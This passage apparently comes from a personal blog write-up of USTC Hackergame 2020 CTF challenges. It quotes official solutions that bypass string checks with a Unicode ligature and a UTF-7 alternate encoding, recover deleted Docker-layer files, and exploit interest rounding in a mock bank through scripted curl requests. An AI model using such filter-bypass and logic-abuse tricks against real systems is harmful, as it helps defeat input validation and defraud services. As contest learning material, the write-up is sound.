中也给出了一个全角-&gt;半角的函数。 实践 那么具体用什么手段来解题呢？ 方法一（不写代码） 例如用 VSCode 的“Select Encoding”功能。 步骤（开始时 UTF-8 打开题目附件）： 1.Save with Encoding -&gt; GBK 2.Reopen with Encoding -&gt; UTF-8 3.Save with Encoding -&gt; ISO8859-1 4.Reopen with Encoding -&gt; GBK （听说 Notepad++ 很方便，蹲一个其他人的 wp） 方法二 （写代码） 见 源代码 中的 solve 函数。 def solve(message): answer=DBC2SBC(message.encode(&quot;gbk&quot;).decode(&quot;UTF-8&quot;).encode(&quot;iso-8859-1&quot;).decode('gbk')) return answer 自复读的复读机 查了很多资料，以为输出有漏洞什么的，还考虑了eval函数、exec函数之类的，但是都不会，或者说没啥效果和思路。几天之后用百度搜“python输出自身的代码”，找到一篇知乎文章https://zhuanlan.zhihu.com/p/34882073 使用第三种方法，然后构造一下让它输出的时候带一个[::-1]，即把串倒序，就能符合题目要求拿到flag，提交后发现多一个\\n，在输出时加一个end=&quot;&quot;即可。 至于sha256，其实就是多一个sha256的计算，把串放进去就行了。 233同学的字符串工具 字符串大写工具 代码的逻辑是输入一个不是flag的串，令其转换成大写之后被识别为FLAG。一开始又去找各种python的输入漏洞，没有收获。看过同僚的思路，知道的就是有一个字符会在转换大写的时候被识别成FL，只是没找到。查了下完整的ascii码表去试，也没啥效果，当时就蠢不知道打个表全输出出来对着找就是了。最后也是没做出来 以下是官方WP: 代码的意思是：如果我们输入一个字面上不是 &quot;flag&quot; 但转换为大写后会变成 &quot;FLAG&quot; 的字符串，就可以得到 flag。 我们可以以 &quot;unicode uppercase collision&quot; 为关键字搜索，不难找到一个连字（ligature） ﬂ (0xFB02) 这个“字符”将在转换为大写时变成 FL 两个字符！因此，只需输入 ﬂag 即可得到 flag。 flag{badunic0debadbad} 编码转换工具 代码的意思是：如果我们输入一个字面上不是 &quot;flag&quot; 但从 UTF-7 转换为 UTF-8 后会变成 &quot;flag&quot; 的字符串，就可以得到 flag。 不妨查阅 UTF-7 相关资料。可以得知：一个 Unicode 字符串，在 UTF-7 编码下，可能有多种编码，甚至纯粹的 ASCII 字符串也可以有多种编码！ 那么事情就简单了。我们依照 Wikipedia 等参考资料给出的 UTF-7 编码算法，可以构造出 &quot;flag&quot; 的另一种“写法”。比如，选择 f 下手。 1.f 的 Unicode 码位是 0x66 2.将 0x66 写成 16 位二进制数：0000 0000 0110 0110 3.重新分组：000000 000110 011000 4.使用 base64 的编码表，将每组变成一个字符：AGY 那么最终 &quot;flag&quot; 的另一种 UTF-7 替代写法就是 +AGY-lag，输入即可得到 flag。 flag{please_visit_www.utf8everywhere.org} （是的，你应该去看这个网站！） 233同学的docker docker0基础学起，其实是因为看到很多人出了这题。pull完docker到ubuntu里，然后搜dockerfile把删除的文件恢复之类的关键词，找到这样一篇文章，https://www.bbsmax.com/A/lk5a10b251/参照着去操作即可cat出flag。 flag{Docker_Layers!=PS_Layers_hhh} 来自一教的图片 matlab对其傅里叶变换处理，报错。openCV装不上，报错，python pip相关的包，报错。心态有点烦躁不想做了 以下是官方wp： 对图像二维傅里叶变换就结束了。灵感来自于中国科学技术大学三级大学物理实验“傅里叶光学”。 用 Python 的解法： import numpy as np import cv2 as cv from matplotlib import pyplot as plt img = cv.imread('./4f_system_middle.bmp', 0) f = np.fft.fft2(img) logf = 20*np.log(np.abs(f)) plt.imshow(logf, 'gray') 由于wp腾挪得比较晚，官方wp的github页面上的配图也丢失了，一些完整的步骤没有了插图等同于没有做wp。下次养成自己做完题目保存做题过程，便于自己写wp和博客，以及和官方wp的对比的习惯，以及及时腾挪wp。 超简陋的openGL小程序 不会openGL，以下是官方wp： https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E8%B6%85%E7%AE%80%E9%99%8B%E7%9A%84%20OpenGL%20%E5%B0%8F%E7%A8%8B%E5%BA%8F/README.md 狗狗银行 非常有趣的一道题目。个人认为个中含有丰富的经济学知识，一开始意识到金钱的数额都是四舍五入，保留整数，这样就能利用这个漏洞去薅羊毛了。储蓄卡里有167元时，每日获利可得0.501元，四舍五入即是1元。按照这个思路去开卡，借钱，养卡去薅，后来思路以及操作上出现了一些失误导致满盘皆输，没跑赢利息，被资本撕裂。或许这辈子只能当个穷鬼而不是资本家了。看了wp才发现手动是非预期。 以下是官方wp： 解法 这道题的主要考点是利用利息四舍五入的规则将实际到手利率翻倍，次要考点是编写脚本自动执行重复性操作。 利率翻倍这一步没什么好说的，简单实验一会就不难发现，当储蓄卡存有 167 狗狗币时，每日利息应当是 0.501 狗狗币，但四舍五入就是 1 狗狗币，实际上利率约等于 0.6%，超过了信用卡利率。信用卡没有这个漏洞，不会因为利息不足 0.5 狗狗币就变成 0，这是有意设计的，避免开很多张信用卡就可以实现零利息获得任意数量的钱。 一个简单的（但不是最节约操作次数的）策略是：开一张信用卡，借很多钱，分开存到很多张储蓄卡中，每张卡存恰好 167 狗狗币。这样一来，这笔钱每天净赚 0.1% 利息，逐渐就能积累到 1000 狗狗币。每隔几天，应当把所有储蓄卡中获得的利息拿走，还回信用卡，因为每张储蓄卡存恰好 167 狗狗币时赚钱最快，越多越慢，当每张储蓄卡存 200 狗狗币时会恰好无法赚钱，之后会开始亏钱。附件中的解题脚本就是按照这个思路编写的，开了 200 张储蓄卡，每天都拿走利息，37 天可以获胜。 怎么写脚本 以下以最新版 Chrome 浏览器为例，其他主流浏览器一般都有类似功能。提到的浏览器界面上的文字都是英文版，使用中文版的请自行猜测我在说什么。（或者干脆别看这一段了，直接去网上搜搜怎么用 Python 写爬虫发请求应该就够了。） 要想编写脚本自动操作，首先需要知道在浏览器中手工操作时会产生什么样的网络请求。如果通过脚本发送一模一样的网络请求，就能取代手工操作，产生一模一样的效果。在狗狗银行页面上按 F12 键打开“开发者工具”，在其中切换到“Network”页面，就可以看到所有浏览器发送的网络请求。去办储蓄卡，会发现每当点击“办卡”按钮时就会有一个“create”请求出现，它的 Url 是 http://202.38.93.111:10100/api/create。在这一行上点右键，“Copy”，“Copy as cURL”，就能复制出类似于这样的命令： curl 'http://202.38.93.111:10100/api/create' \\ -H 'Connection: keep-alive' \\ -H 'Pragma: no-cache' \\ -H 'Cache-Control: no-cache' \\ -H 'Accept: application/json, text/plain, */*' \\ -H 'DNT: 1' \\ -H 'Authorization: Bearer 1:MEUCIQDG+Pwf82nVTQC07Kkmt6YkDbYo/uEsRu8f6f3HCXGQ2AIgJFlltu51Y6lNJ1sEHMviqOnoc75k1A6Qn3xoLBxM1qw=' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \\ -H 'Content-Type: application/json;charset=UTF-8' \\ -H 'Origin: http://202.38.93.111:10100' \\ -H 'Referer: http://202.38.93.111:10100/' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ --data-binary '{&quot;type&quot;:&quot;debit&quot;}' \\ --compressed \\ --insecure 在 Linux（需要安装 curl）命令行上运行这条命令，再刷新网页，就会发现也能办出储蓄卡。实际上，对于这道题的后端服务器来说，这个请求重要的部分只有： 发送 POST 请求给 http://202.38.93.111:10100/api/create。 包含 HTTP 请求头：Authorization: Bearer 1:MEUCIQDG+Pwf82nVTQC07Kkmt6YkDbYo/uEsRu8f6f3HCXGQ2AIgJFlltu51Y6lNJ1sEHMviqOnoc75k1A6Qn3xoLBxM1qw=，注意其中包含着 token，这说明了你在操作哪个账号。 包含 HTTP 请求头：Content-Type: application/json;charset=UTF-8，这说明了这个请求的正文是 JSON 格式的。 包含请求正文：{&quot;type&quot;:&quot;debit&quot;}。 除了使用 curl 命令以外，还可以用各种编程语言发送这个请求，方法上网搜索很容易找到。 再经过一些尝试，不难找到办信用卡的请求、吃饭的请求、以及转账的请求（有的请求的正文中有可以改变的参数，表示卡号等信息）。这样就有了完成这道题所需要的所有请求。可以使用复制粘贴加一点修改的方法在一份文档中整理好需要按顺序执行的所有请求，然后全部执行，当然还是推荐学习一下怎么写变量和循环语句。 wp里有一句话写得有些尖锐，但是这就是我目前的瓶颈。 遗憾是这导致手工进行所有操作所需要的时间也较短，在 7 天的比赛中完全可以完成，一些选手因此误以为手工操作也是这道题的一种预期解法，不仅没有借助这道题学会编写脚本发请求，反而浪费了大量时间和精力。今后出题应当避免类似情况，如果预期解需要自动化操作，就不应当让手工操作有完成的可能性。 其余的题感觉有些偏门了(其实就是懒)，就不挪到这边了。 所有题目的wp：https://github.com/USTC-Hackergame/hackergame2020-writeups ","link":"http://ayanagi.fun/Hackergame2020/"},{"title":"0xCTF-misc wp","content":"第一次接触的CTF ","link":"http://ayanagi.fun/0xCTF/"}]}